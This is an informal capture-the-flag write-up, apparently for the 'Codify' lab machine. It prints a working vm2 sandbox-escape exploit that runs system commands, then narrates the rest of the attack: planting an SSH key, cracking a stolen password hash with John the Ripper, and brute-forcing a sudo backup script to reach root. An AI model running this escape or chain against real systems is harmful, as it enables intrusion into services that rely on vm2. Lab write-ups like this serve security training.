reading through the website, they are using vm2 technology
there is an exploit with this technology for sandbox outbreak
I am able to use the exploit below to run commands in the editor webpage
----------
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'id'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));

Attempting several types of shells via python, ruby, c, sh, none are functional
I will now attempt to upload my Kali Box's ssh key to the machine using this method
	First, I have to generate my ssh key with ssh-keygen
	created the key and began fiddling with the above mentioned code to upload this into ~/.ssh/authorized_keys
	
doing a cat out for /etc/passwd, we find the user Joshua

looking all through the file system, we find /var/www/contact/tickets.db
This seems to have an encrypted password for the user Joshua, running this through John The Ripper using rockyou.txt
We get the decrypted password of "spongebob1"!
Let's try to ssh into the host using joshua@codify.htb:spongebob1

We're in!

We arrive to Joshua's home directory and instantly get the user.txt flag
We are unable to cd into the /root directory however
running sudo -l, joshua may run the following commands on codify: root /opt/scripts/mysql-backup.sh

I move into the /tmp directory and am attempting a password dump via python from https://github.com/learnpentest/pythonbrute/blob/main/brute.py

I get "kljh12k3jhaskjh12kjh3", let's try to log in as root on the off chance this works

ssh root@codify.htb:kljh12k3jhaskjh12kjh3, this fails
however, from the existing ssh session with Joshua, we can su there.  There is likely no root ssh login enabled

We are in as root!
We can now cat out /root/root.txt
